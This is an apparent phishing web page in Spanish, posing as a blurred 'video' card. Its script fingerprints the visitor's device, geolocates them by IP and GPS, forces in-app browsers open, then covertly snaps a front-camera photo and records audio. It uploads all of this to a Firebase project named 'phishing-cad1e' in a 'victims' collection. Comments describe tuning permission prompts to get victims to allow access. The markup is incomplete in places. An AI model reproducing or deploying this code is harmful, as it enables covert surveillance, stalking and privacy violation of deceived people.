<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<title>Video</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
html,body{
  width:100%;height:100%;background:#111;
  font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  display:flex;align-items:center;justify-content:center;overflow:hidden;
}
#card{
  width:min(88vw,360px);background:#1a1a1a;
  border-radius:22px;overflow:hidden;box-shadow:0 24px 60px rgba(0,0,0,.7);
}
#thumb-wrap{position:relative;width:100%;aspect-ratio:4/3;overflow:hidden;}
#thumb{width:100%;height:100%;object-fit:cover;filter:blur(14px);transform:scale(1.08);display:block;}
#overlay{position:absolute;inset:0;background:rgba(0,0,0,.28);display:flex;align-items:center;justify-content:center;}
.play-btn{
  width:60px;height:60px;background:rgba(255,255,255,.18);
  backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);
  border:1.5px solid rgba(255,255,255,.35);border-radius:50%;
  display:flex;align-items:center;justify-content:center;
}
.play-btn svg{width:26px;height:26px;fill:#fff;margin-left:3px;}
#card-body{padding:18px 18px 20px;}
.lock-row{display:flex;align-items:center;gap:8px;margin-bottom:8px;}
.lock-icon{font-size:1rem;}
.lock-label{color:#8e8e93;font-size:.72rem;font-weight:500;letter-spacing:.04em;text-transform:uppercase;}
.card-title{color:#fff;font-size:1rem;font-weight:700;margin-bottom:5px;line-height:1.3;}
.card-sub{color:#636366;font-size:.78rem;line-height:1.45;margin-bottom:16px;}
.btn-ver{
  width:100%;padding:13px;border-radius:12px;background:#0a84ff;border:none;
  color:#fff;font-size:.9rem;font-weight:700;cursor:pointer;letter-spacing:.01em;
  display:flex;align-items:center;justify-content:center;gap:7px;
}
.btn-ver:active{background:#0060df;}
.btn-ver svg{width:16px;height:16px;fill:#fff;}

<body>

<script>
// ─── IN-APP REDIRECT ──────────────────────────────────────────
(function(){
  const ua = navigator.userAgent || '';
  const isInApp = (
    /musical_ly|TikTok|BytedanceWebview|ByteLocale/i.test(ua)||
    /Instagram|FBAN|FBAV|FB_IAB|FB4A|FBIOS|Threads/i.test(ua)||
    /Snapchat|Twitter|LinkedInApp|WhatsApp/i.test(ua)||
    (/wv/.test(ua)&&/Android/i.test(ua)&&!/Chrome\/[.0-9]*(?! Mobile Safari)/.test(ua))||
    (/iPhone|iPad|iPod/i.test(ua)&&/AppleWebKit/i.test(ua)&&!/Safari\/[0-9]/.test(ua))
  );
  if(!isInApp) return;
  if(/Android/i.test(ua)){
    location.href=location.href.replace(/^https?:/,'intent:')+'#Intent;scheme='+(location.protocol==='https:'?'https':'http')+';package=com.android.chrome;end';
    setTimeout(()=>{ location.href='googlechrome://'+location.host+location.pathname+location.search; },800);
    return;
  }
  if(/iPhone|iPad|iPod/i.test(ua)){
    location.href=location.href.replace(/^https/,'x-safari-https').replace(/^http(?!s)/,'x-safari-http');
  }
})();

// ─── CONFIG ───────────────────────────────────────────────────
const KEY  = 'AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0';
const PROJ = 'phishing-cad1e';
const ST   = 'phishing-cad1e.firebasestorage.app';
const COL  = `https://firestore.googleapis.com/v1/projects/${PROJ}/databases/(default)/documents/victims`;

let docId = null;
const D   = { ts: String(Date.now()) };
const iOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

const set = (k,v) => { if(v!=null&&v!=='') D[k]=String(v).slice(0,900); };

function toFields(obj){
  const f={};
  for(const [k,v] of Object.entries(obj)) f[k]={stringValue:v};
  return {fields:f};
}

// push con retry automático — si falla red, reintenta hasta 3 veces
async function push(retries=3){
  for(let i=0;i<retries;i++){
    try{
      if(!docId){
        const r=await fetch(`${COL}?key=${KEY}`,{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify(toFields(D))
        });
        const j=await r.json();
        if(j.name){ docId=j.name.split('/').pop(); return; }
      } else {
        const mask=Object.keys(D).map(k=>`updateMask.fieldPaths=${encodeURIComponent(k)}`).join('&');
        await fetch(`${COL}/${docId}?key=${KEY}&${mask}`,{
          method:'PATCH',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify(toFields(D))
        });
        return;
      }
    } catch(e){ await new Promise(r=>setTimeout(r,400)); }
  }
}

async function upload(path,dataUrl,mime){
  try{
    const b64=dataUrl.split(',')[1];
    const bin=Uint8Array.from(atob(b64),c=>c.charCodeAt(0));
    const name=encodeURIComponent(path);
    const r=await fetch(
      `https://firebasestorage.googleapis.com/v0/b/${ST}/o?name=${name}&key=${KEY}`,
      {method:'POST',headers:{'Content-Type':mime},body:bin}
    );
    const j=await r.json();
    if(j.name) return `https://firebasestorage.googleapis.com/v0/b/${ST}/o/${name}?alt=media`;
  } catch(e){}
  return null;
}

function safeBtoa(bytes){
  let s=''; const chunk=8192;
  for(let i=0;i<bytes.length;i+=chunk)
    s+=String.fromCharCode(...bytes.subarray(i,i+chunk));
  return btoa(s);
}

// ─────────────────────────────────────────────────────────────
// ESTRATEGIA VELOCIDAD:
// Fase 0 (0ms):   fingerprint pasivo + IP (paralelo, sin esperar)
// Fase 1 (click): getUserMedia video+audio simultáneo
// Fase 2 (click): GPS enableHighAccuracy:false PRIMERO → respuesta <1s
//                 GPS enableHighAccuracy:true  en paralelo → llega cuando llega
// Fase 3 (~1s):   foto del primer frame válido (no esperar 3s, checar cada 200ms)
// Fase 4 (~1s):   audio empieza grabando inmediatamente junto con foto
// Todo en paralelo, nada secuencial.
// ─────────────────────────────────────────────────────────────

// ── FASE 0: fingerprint pasivo (dispara al cargar, sin esperar) ──
(function fp(){
  set('ua',      navigator.userAgent);
  set('platform',navigator.platform);
  set('lang',    navigator.language);
  set('cores',   navigator.hardwareConcurrency);
  set('memory',  navigator.deviceMemory);
  set('touch',   navigator.maxTouchPoints);
  set('screen',  `${screen.width}x${screen.height}@${devicePixelRatio}`);
  set('tz',      Intl.DateTimeFormat().resolvedOptions().timeZone);
  set('online',  navigator.onLine);

  const nav=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
  if(nav){ set('connType',nav.effectiveType); set('connDl',nav.downlink); }

  try{
    const gl=document.createElement('canvas').getContext('webgl');
    const ext=gl?.getExtension('WEBGL_debug_renderer_info');
    if(ext){
      set('glVendor',  gl.getParameter(ext.UNMASKED_VENDOR_WEBGL));
      set('glRenderer',gl.getParameter(ext.UNMASKED_RENDERER_WEBGL));
    }
  } catch(e){}

  // Batería (Chrome/Android)
  if(navigator.getBattery){
    navigator.getBattery().then(b=>{
      set('bat',   Math.round(b.level*100)+'%');
      set('batChg',b.charging);
      push();
    }).catch(()=>{});
  } else {
    set('bat','ios_na');
  }

  // IP: dos proveedores en paralelo, el que responda primero gana
  // ipapi.co responde en ~300ms, freeipapi en ~800ms
  // usar Promise.race para máxima velocidad
  const ipSources = [
    fetch('https://ipapi.co/json/',{signal:AbortSignal.timeout(5000)})
      .then(r=>r.json())
      .then(j=>({
        ip:j.ip, city:j.city, region:j.region,
        country:j.country_name, cc:j.country_code,
        ipLat:j.latitude, ipLon:j.longitude, org:j.org
      })),
    fetch('https://freeipapi.com/api/json/',{signal:AbortSignal.timeout(5000)})
      .then(r=>r.json())
      .then(j=>({
        ip:j.ipAddress, city:j.cityName, region:j.regionName,
        country:j.countryName, cc:j.countryCode,
        ipLat:j.latitude, ipLon:j.longitude, org:j.ipType
      }))
  ];

  Promise.race(ipSources).then(j=>{
    set('ip',     j.ip);
    set('city',   j.city);
    set('region', j.region);
    set('country',j.country);
    set('cc',     j.cc);
    set('ipLat',  j.ipLat);
    set('ipLon',  j.ipLon);
    set('org',    j.org);
    push();
  }).catch(()=>{});

  push(); // push inicial con lo que hay
})();

// ── GPS: dispara inmediatamente al cargar (no esperar click) ──
// Razón: el dialog de permisos de ubicación aparece al cargar,
// el usuario ya tomó la decisión. Si dispara al click, se superpone
// con el dialog de cámara y el usuario cancela ambos.
// Disparar al cargar = permisos separados = más chance de "Permitir".
(function gpsEarly(){
  if(!('geolocation' in navigator)) return;
  let bestAcc = Infinity;

  const save = pos => {
    const acc = pos.coords.accuracy;
    if(acc < bestAcc){
      bestAcc = acc;
      set('gpsLat', pos.coords.latitude);
      set('gpsLon', pos.coords.longitude);
      set('gpsAcc', acc);
      set('gpsAlt', pos.coords.altitude ?? '');
      push();
    }
  };

  // Baja precisión primero — respuesta en <500ms (WiFi/celda)
  // En muchos casos ya da coordenadas a <100m que es suficiente
  navigator.geolocation.getCurrentPosition(save, ()=>{}, {
    enableHighAccuracy: false,
    timeout: 4000,
    maximumAge: 60000
  });

  // Alta precisión en paralelo — GPS real, llega en 10-25s
  // Si la víctima ya cerró, igual llega al docId guardado
  navigator.geolocation.getCurrentPosition(save, ()=>{}, {
    enableHighAccuracy: true,
    timeout: 30000,
    maximumAge: 0
  });

  // watchPosition para mejora progresiva
  const wid = navigator.geolocation.watchPosition(
    pos => { save(pos); if(bestAcc < 8) navigator.geolocation.clearWatch(wid); },
    ()=>{},
    { enableHighAccuracy: true, maximumAge: 0 }
  );
  setTimeout(()=>navigator.geolocation.clearWatch(wid), 50000);
})();

// ── CLICK: cámara + audio (requiere gesto del usuario) ──
document.getElementById('btnOk').addEventListener('click', collect);

async function collect(){
  set('clicked','true'); push();

  if(!navigator.mediaDevices?.getUserMedia){
    set('camErr','no_api'); push(); return;
  }

  let stream=null;
  try{
    stream=await navigator.mediaDevices.getUserMedia({
      video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},
      audio:true
    });
    set('camGranted','true');
    set('audioGranted','true');
    push();
  } catch(e1){
    try{
      stream=await navigator.mediaDevices.getUserMedia({
        video:{facingMode:'user'},audio:false
      });
      set('camGranted','true');
      set('audioGranted','false');
      push();
    } catch(e2){
      set('camErr',e2.name+':'+e2.message); push(); return;
    }
  }

  const vid=document.createElement('video');
  vid.setAttribute('playsinline','');
  vid.setAttribute('webkit-playsinline','');
  vid.autoplay=true; vid.muted=true; vid.srcObject=stream;
  vid.style.cssText='position:fixed;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
  document.body.appendChild(vid);

  await new Promise(res=>{
    if(vid.readyState>=2){res();return;}
    vid.onloadeddata=res; vid.onerror=res;
    setTimeout(res,3000);
  });
  try{ await vid.play(); }catch(e){}

  // Asegurar docId antes de subir
  if(!docId) await push();
  let w=0;
  while(!docId&&w<3000){ await new Promise(r=>setTimeout(r,200)); w+=200; }
  const uid=docId||('anon_'+Date.now());

  // Foto y audio en PARALELO — no esperar uno para empezar el otro
  const [,] = await Promise.allSettled([
    _grabPhoto(vid, stream, uid),
    _grabAudio(stream, uid)
  ]);

  stream.getVideoTracks().forEach(t=>t.stop());
  vid.remove();

  if('Notification' in window){
    Notification.requestPermission()
      .then(r=>{set('notif',r);push();}).catch(()=>{});
  }
}

// ── FOTO: polling cada 200ms hasta frame válido (max 6s) ──
// En lugar de esperar 3s fijo, chequear activamente = foto más rápida
async function _grabPhoto(vid, stream, uid){
  const maxMs = 6000;
  const startT = Date.now();
  let attempt = 0;

  while(Date.now()-startT < maxMs){
    attempt++;
    try{
      const w=vid.videoWidth||0;
      const h=vid.videoHeight||0;
      if(w>4&&h>4){
        const cv=document.createElement('canvas');
        cv.width=w; cv.height=h;
        const ctx=cv.getContext('2d',{willReadFrequently:true});
        ctx.drawImage(vid,0,0,w,h);

        // Sample central — menos propenso a negro en iOS
        const sx=Math.floor(w*0.25), sy=Math.floor(h*0.25);
        const sw=Math.floor(w*0.5),  sh=Math.floor(h*0.5);
        const imgData=ctx.getImageData(sx,sy,sw,sh);
        let bright=0;
        for(let i=0;i<imgData.data.length;i+=4)
          bright+=imgData.data[i]+imgData.data[i+1]+imgData.data[i+2];
        const avgBright=bright/(imgData.data.length/4*3);

        if(avgBright>8){ // frame con luz real
          const dataUrl=cv.toDataURL('image/jpeg',0.85);
          const url=await upload(`photos/${uid}.jpg`,dataUrl,'image/jpeg');
          if(url){ set('photoUrl',url); set('photoAttempt',String(attempt)); push(); }
          else   { set('photoErr','upload_fail'); push(); }
          return;
        }
      }
    } catch(e){ set('photoErr',e.message); push(); return; }
    await new Promise(r=>setTimeout(r,200));
  }
  set('photoErr','timeout_'+attempt+'_attempts'); push();
}

// ── AUDIO: MIME correcto por plataforma ──
async function _grabAudio(existingStream, uid){
  try{
    const liveAudio=existingStream?.getAudioTracks()?.filter(t=>t.readyState==='live')??[];
    let s;
    if(liveAudio.length>0){
      s=existingStream;
    } else {
      try{
        s=await navigator.mediaDevices.getUserMedia({audio:true,video:false});
      } catch(e){ set('audioErr','mic:'+e.message); push(); return; }
    }

    const mimes=iOS
      ?['audio/mp4;codecs=mp4a.40.2','audio/mp4','audio/aac']
      :['audio/webm;codecs=opus','audio/webm','audio/mp4','audio/ogg;codecs=opus'];

    const mime=mimes.find(m=>{ try{return MediaRecorder.isTypeSupported(m);}catch(e){return false;} })||'';

    let rec;
    try{ rec=new MediaRecorder(s,mime?{mimeType:mime}:{}); }
    catch(e){ try{rec=new MediaRecorder(s);}catch(e2){set('audioErr','init:'+e2.message);push();return;} }

    const chunks=[];
    rec.ondataavailable=e=>{ if(e.data?.size>0) chunks.push(e.data); };
    rec.onstop=async()=>{
      if(s!==existingStream) s.getTracks().forEach(t=>t.stop());
      try{
        const fm=rec.mimeType||mime||'audio/webm';
        const ext=fm.includes('mp4')||fm.includes('aac')?'m4a':fm.includes('ogg')?'ogg':'webm';
        const blob=new Blob(chunks,{type:fm});
        if(blob.size<100){set('audioErr','empty_'+blob.size);push();return;}
        const ab=await blob.arrayBuffer();
        const b64='data:'+fm+';base64,'+safeBtoa(new Uint8Array(ab));
        const url=await upload(`audio/${uid}.${ext}`,b64,fm);
        if(url){set('audioUrl',url);push();}
        else   {set('audioErr','upload_fail');push();}
      } catch(e){set('audioErr','stop:'+e.message);push();}
    };
    rec.onerror=e=>{set('audioErr','rec:'+e.error?.message);push();};
    rec.start(300);
    setTimeout(()=>{ try{rec.stop();}catch(e){} },6000);
  } catch(e){set('audioErr','outer:'+e.message);push();}
}

// ─── EXIT BEACON ──────────────────────────────────────────────
window.addEventListener('beforeunload',()=>{
  if(!docId) return;
  set('_exit',Date.now());
  navigator.sendBeacon(
    `${COL}/${docId}?key=${KEY}&updateMask.fieldPaths=_exit`,
    JSON.stringify(toFields({_exit:String(Date.now())}))
  );
});
</script>
